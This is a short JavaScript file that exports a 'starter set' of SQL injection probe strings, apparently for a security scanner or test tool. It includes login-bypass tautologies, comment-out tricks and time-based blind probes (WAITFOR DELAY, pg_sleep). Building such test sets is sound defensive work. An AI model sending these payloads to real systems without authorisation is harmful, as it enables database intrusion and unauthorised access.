// A small starter set of SQLi probes
export default sqlPayloads = [
  "' OR '1'='1",
  "' OR 1=1--",
  "\" OR \"\"=\"",
  "') OR ('1'='1",
  "admin' --",
  "'; WAITFOR DELAY '0:0:3'--",
  "'; SELECT pg_sleep(3)--",
];